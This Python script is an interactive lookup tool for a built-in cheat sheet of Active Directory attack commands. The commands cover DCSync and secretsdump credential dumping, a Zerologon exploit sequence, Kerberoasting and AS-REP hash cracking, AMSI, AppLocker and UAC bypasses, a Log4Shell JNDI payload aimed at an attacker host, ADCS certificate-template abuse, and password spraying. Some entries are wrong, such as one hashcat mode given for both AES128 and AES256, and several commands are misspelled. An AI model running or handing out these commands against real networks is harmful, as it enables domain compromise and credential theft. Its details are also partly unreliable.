#!/usr/bin/env python3

# Enumeration Database
enum_db = {
    "DCSYNC": [
        "====================",
        "DCSync",
        "##Admins, Domain Admins, or Enterprise Admins as well as Domain Controller Computer Accounts",
        "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator",
        "secretsdump <domain>/<user>:<password>@<domain_controller>"],

    "GENERIC WRITE ON GPO": [
        "==================================",
        "Generic write on GPO",
        "Generic Write on GPO = Abuse GPO = Access"],

    "SID OF NEW GPO CREATORS": [
        "=====================================",
        "SID of new GPO Creators",
        "Get-DomainObjectAcl -SearchBase CN=Policies,CN=System,DC=blah,DC=com -ResolveGUIDs | ? {$_.ObjectAceType -eq Group-Policy-Container } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl",
        "Who can write to the GP-Link Attribute on OUs",
        "Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -eq GP-Link -and $_.ActiveDirectoryRights -match WriteProperty } | select ObjectDN, SecurityIdentifier | fl"],

    "ON COMPUTER": [
        "=========================",
        "On Computer",
        "GenericAll/GenericWrite",
        "> msDs-AllowedToActOnBehalf",
        "> add Key Credentials"],

    "ON GROUP": [
        "======================",
        "On Group",
        "Properties you want to have:",
        "-Self on Group",
        "- GenericAll/WriteProperty on Group",
        "- WriteProperty (Self-Membership)",
        "- WriteOwner on Group",
        "- WriteDACL + WriteOwner",
        "> Give yourself Generic all rights",
        "net group group <myuser> /add /domain"],

    "ON USER": [
        "=====================",
        "On User"],

    "FORCECHANGEPASSWORD": [
        "=================================",
        "ForceChangePassword",
        "net user <user> <password> /domain",
        "- User with a clear text password can be found here"],

    "GENERICALL-GENWRITE": [
        "=================================",
        "GenericAll/GenWrite",
        "> Change the password",
        "> net user <user> <password> /domain",
        "> Add SPN (target Kerberoasting)",
        "> targetedKerberoast.py -d <domain> -u <user> -p <pass>",
        "> Add Key credentials",
        "> logon script"],

    "SHADOW CREDENTIALS": [
        "================================",
        "Shadow Credentials",
        "Whisker.exe",
        "certipy shadow auto -u <user>@<domain> -p <password> -account <target_account>",
        "pywhisker.py",
        "> pywhisker.py -d FQDN_DOMAIN -u user1 -p CERTIFICATE_PASSWORD --target TARGET_SAMNAME --action list"],

    "KERBEROS 5 TGS": [
        "============================",
        "Kerberos 5 TGS",
        "‎hashcat -m 13100 -a 0 spn.txt rockyou.txt",
        "john spn.txt --format=krb5tgs --wordlist=rockyou.txt"],

    "KERBEROS 5 TGS AES128": [
        "===================================",
        "Kerberos 5 TGS AES128",
        "‎hashcat -m 19700 -a 0 spn.txt rockyou.txt"],

    "KERBEROS 5 TGS AES256": [
        "===================================",
        "Kerberos 5 TGS AES256",
        "‎hashcat -m 19700 -a 0 spn.txt rockyou.txt"],

    "KERBEROS ASREP": [
        "============================",
        "Kerberos ASREP",
        "hashcat -m 18200 -a 0 AS-REP_roast-hashes rockyou.txtx"],

    "LM": [
        "================",
        "LM",
        "john --format=lm hash.txt",
        "hashcat -m 3000 -a 3 hash.txt"],

    "MSCACHE 2(SLOW)": [
        "=============================",
        "MsCache 2(slow)",
        "hashcat -m 2100 -a 0 mscache-hash rockyou.txt"],

    "NETNTLMV1": [
        "=======================",
        "NetNTLMv1",
        "https://crack.sh/",
        "hashcat -m 5500 -a 3 hash.txt",
        "john --format=netntlm hash.txt"],

    "NETNTLMV2": [
        "=======================",
        "NetNTLMv2",
        "hashcat -m 5600 -a 0 hash.txt rockyou.txt",
        "john --format=netntlmv2 hash.txt"],

    "NTLM": [
        "==================",
        "NTLM",
        "john --format=nt hash.txt",
        "hashcat -m 1000 -a 3 hash.txt"],

    "AMSI BYPASS": [
        "=========================",
        "AMSI Bypass",
        "- https://amsi.fail",
        "- Reflection Method",
        "- Patching amsi.dll"],

    "APPLOCKER WHITELISTING BYPASS": [
        "=============================================",
        "Applocker (whitelisting) bypass",
        "- use C:\Windows\Tasks",
        "- use C:\Windows\Temp",
        "- Powershell CLM Bypass: installutil.exe / - logfile= /LogToConsole=false /U C:\runme.exe",
        "- mshta.exe my.hta",
        "- MSBuild"],

    "CVES": [
        "==================",
        "CVEs",
        "SMBGhost CVE-2020-0796",
        "CVE-2021-36934 (SeriousSAM/HiveNightmare)",
        "Service Account (IIS/Mssql) (got SEImpersonate)",
        "- Rogue Potato",
        "- Juicy Potato/Lovely Potato",
        "- PrintSpoofer"],

    "GET APPLOCKER INFO": [
        "================================",
        "Get Applocker info",
        "Get Applocker info",
        "- Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe (dll/msi...)"],

    "KRBRELAYUP": [
        "========================",
        "KrbRelayUp",
        "- ‎.\KrbRelayUp.exe relay -Domain <domain> -‎CreateNewComputerAccount -ComputerName <‎computer$> -ComputerPassword <password>",
        "- ./KrbRelayUp.exe spawn -m rbcd -d <omdain> -dc <dc> -cn <computer_name> -cp <computer_pass>"],

    "SEARCH PASSWORD FILES": [
        "===================================",
        "Search Password Files",
        "- findstr /si password *.txt *.xml *.docx"],

    "USER ACCOUNT CONTROL BYPASS": [
        "=========================================",
        "User Account Control Bypass",
        "- FodHelper",
        "- WS Reset",
        "- MSDT"],

    "WINPEAS.EXE": [
        "=========================",
        "New Page",
        "Use winpeas"],

    "COLLECTION OF VULNERABILITIES": [
        "===========================================",
        "Collection of Vulnerabilities",
        "‎tomcat/jboss manager",
        "auxilliary/scanner/http/tomcat_enum_exploit/multi/http/tomcat_mgr_deploy",
        "java rmi - exploit/multi/misc/java_rmi_server",
        "java serialized port",
        "-ysoserial",
        "Proxylogon",
        "Proxyshell",
        "log4shell",
        "-",
        "‎${jndi:ldap://<ip>:<port>/o=reference}",
        "-",
        "‎rogueJndi-1.0.jar",
        "Database credentials",
        "-",
        "‎use admin/mssql/mssql_enum_sql_logins",
        "- MSSQL Connection"],

    "ETERNAL BLUE": [
        "==========================",
        "New Page",
        "Eternal Blue MS17-010",
        "You know lmao"],

    "SYSVOL AND GPP": [
        "============================",
        "Sysvol and GPP",
        "## MS14-025",
        "Use Scanner/smb/smb_enum_gpp",
        "findstr /S /I cpassword \\FQDN\sysvol\FQDN\policies\*.xml"],
    "ZEROLOGON": [
        "=======================",
        "zerologon",
        "## Use of CVE-2020-1472",
        "zerologon-scan DOMAIN CONTROLLER NETBIOS NAME IP",
        "python3 cve-2020-1472-exploit.py DOMAIN/MACHINE BIOS NAME \$@ IP -no-pass -just-dc-user Administrator",
        "secretsdump.py -hashes: HASH OF ADMIN <DOMAIN>/Administrator@IP",
        "python3 restorepassword.py -target-ip IP DOMAIN/MACHINEBIOSNAME@MACHINEBIOSNAME -hexpass <HEXPASS>",
        "##This can potentially compromise Admins and Domain Administrators"],

    "FINDING DC IP": [
        "===========================",
        "Finding DC IP",
        "##",
        "Show Domain Name and DNS",
        "nmcli dev show eth0",
        "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>"],

    "FINDING USERS": [
        "===========================",
        "Finding Users",
        "## The following are commands to find user lists on domain devices",
        "## If users are found then move to found credentials folder",
        "enum4linux -U <dc-ip> | grep user:",
        "cme smb IP --users",
        "net rpc group members Domain Users -W DOMAIN -l IP -U %",
        "OSINT from internet",
        "nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=DOMAIN, userdb=<users list file IP"],

    "LDAP ENUMERATION": [
        "==============================",
        "LDAP Enumeration",
        "## LDAP ENUMERATION",
        "## If a user is found, open the user found no credentials folder and move from there",
        "nmap -n -sV --script ldap* and not brute -p 389 <dc-ip>",
        "ldapsearch -x -h IP -s base"],
    "NETWORK SCANNING": [
        "==============================",
        "Network Scanning",
        "cme smb <IP range>",
        "nmap -sP -p IP ## Ping scan",
        "nmap -PN -sV --top-ports 50 --open IP ## Quick Scan",
        "nmap -PN --script smb-vuln* -p139,445 IP ##Search smb vulnerabilities",
        "nmap -PN -sC -sV -oA <Output> IP ## Classic Scan",
        "nmap -PN -sC -sV -p- -oA <Output> IP ## Full Scan",
        "nmap -sU -sC -sV -oA <Output> IP ## udp scan",
        "-----------------------------------------------------------------------------",
        "This is ORANGE CYBER DEFENSEs approach to scanning a network and finding Vulnerable hosts",],

    "SMB SHARE GUEST ACCESS": [
        "====================================",
        "SMB Share Guest Access",
        "##",
        "These are techniques to list guest access on an smb share",
        "enum4linux -a -u  -p  <dc-IP> && enum4linux -a -u guest -p  <dc-IP>",
        "smbmap -u  -p  -P 445 -H <dc-IP> && smbmap -u guest -p  -P 445 -H <dc-IP>",
        "smbclient -U % -L // <DC-IP> && smbclient -U  guest% -L//<dc-IP>",
        "## Enumerate a null session",
        "cme smb IP -u -p",
        "## Enumerate anonymous access",
        "cme smb IP -ua -p"],

    "ZONE TRANSFER": [
        "===========================",
        "Zone Transfer",
        "dig axfr <Domain name> @ <name_server>"],
    "BLIND KERBEROASTING": [
        "=================================",
        "Blind Kerberoasting",
        "GetUserSPNs.py -no-preauth <asrep_user> -usersfile <user_list.txt> -dc-host <dc_ip> <domain>/"],
    "CVE-2022-33679": [
        "============================",
        "CVE-2022-33679",
        "Title says it all tron",],
    "GET ASREPROASTABLEUSERS": [
        "=====================================",
        "Get ASREPRoastableUsers",
        "Get-DomainUser -PreauthNotRequired -Properties SamAccountName",
        "MATCH (u:User {dontreqpreauth:true}), (c:Computer), p=shortestPath((u)-[*]..]->(c)) RETURN p"],
    "GET HASH": [
        "======================",
        "Get Hash",
        "python GetNPUsers.py <domain>/ -usersfile <usernames.txt> -format hashcat -outputfile <hashes.domain.txt>",
        "Rubeus.exe asreproast /format:hashcat"],
    "CLEARTEXT CREDS ATTACK": [
        "====================================",
        "Cleartext Creds Attack",
        "‎cme smb <dc-ip> -u user.txt -p password.txt --",
        "no-bruteforce # test user=password",
        "cme smb <dc-ip> -u user.txt -p password.txt #multiple test",
        "sprayhound -U <users.txt> -d <domain> -dc <dcip"],
    "GETTING PASSWORD POLICY": [
        "=====================================",
        "Getting Password Policy",
        "cme IP -u user -p password --pass-pol",
        "enum4linux -u username -p password -P IP",
        "Get-ADDefaultDomainPasswordPolicy",
        "Get-ADFineGrainedPasswordPolicy -filter *",
        "Get-ADUserResultantPasswordPolicy -Identity <user>",
        "ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols"],
    "USER ENUMERATION": [
        "==============================",
        "User Enumeration",
        "Get All Users:",
        "GetADUsers.py -all -dc-ip IP <domain>/<username>",
        "cme smb IP -u <user> -p <password> --users",
        "Enumerate SMBShare",
        "cme smb <IP> -u <user> -p <password> --shares"],
    "DISPLAY CA INFORMATION": [
        "====================================",
        "Display CA Information",
        "How to Display CA information",
        "certutil -TCAInfo",
        "certify.exe cas"],
    "GET ACL INFO": [
        "==========================",
        "Get ACL Info",
        "ACL Enumeration Technique",
        "certipy find -u <user>@<domain> -p <password> -dc-ip <domaincontroller>"],
    "ESC4 ATTACK VECTOR": [
        "ESC4 Attack Vector",
        "Write Privileges over a certificate template",
        "certipy template -u <user>@<domain> -p <password> -template <vulnerability_template> -save-old -debug",
        "USE ESC1 On a vulnerable template",],
    "ESC7 ATTACK VECTOR": [
        "================================",
        "ESC7 Attack Vector",
        "Manage CA:",
        "certipy ca -ca <ca_name> -add-officer <user> -username <user>@<domain> -password <password>",
        "Manage certificate",
        "certipy ca -ca <ca_name> -enable-template <ecs1_vuln_template> -username <user>@<domain> -password <password>",
        "after:",
        "certifpy req -username <user>@<domain> -password <password> -ca <ca_name> -template <vulnerable template name> -upn <target_user>"],
    "GET CA FLAGS": [
        "==========================",
        "Get CA Flags",
        "certutil -config CA_HOST\CA_NAME -getreg policy\EditFlags",
        "certipy /certify.exe (only the flag ATTRIBUTESUBJECTALTNAME2)"],
    "GET PKI OBJECT INFO": [
        "=================================",
        "Get PKI Object Info",
        "Enumeration:",
        "certify.exe pkiobjects",
        "Can find Vulnerable PKI Object Access Control",
        "> ESC5 > ACL"],
    "GET TEMPLATES INFO": [
        "================================",
        "Get Templates info",
        "certutil -v -dsTemplate",
        "certify.exe find [ /vulnerable]",
        "------------------------------------------------------",
        "certipy find -u <user>@<domain> -p <password> -dc-ip <domaincontroller>"
    ]
}


def search_db(keyword):
    matches = {}
    for service, commands in enum_db.items():
        if keyword.lower() in service.lower():
            matches[service] = commands
    return matches


def main():
    while True:
        print("\nAvailable Services for Enumeration:")
        for service in enum_db.keys():
            print(service)
        choice = input(
            "\nEnter service name to see commands, 'search' to search for a service, or 'exit' to quit: ").upper()

        if choice == 'EXIT':
            break
        elif choice == 'SEARCH':
            keyword = input("Enter keyword to search: ")
            matched_services = search_db(keyword)
            if matched_services:
                print("\nServices matched:")
                for service in matched_services:
                    print(service)
            else:
                print(f"No services matched the keyword '{keyword}'.")
        elif choice in enum_db:
            print(f"\nEnumeration commands for {choice}:")
            for cmd in enum_db[choice]:
                print(cmd)
        else:
            print("Invalid choice. Please enter a valid service name or choose 'search'.")


if __name__ == "__main__":
    main()
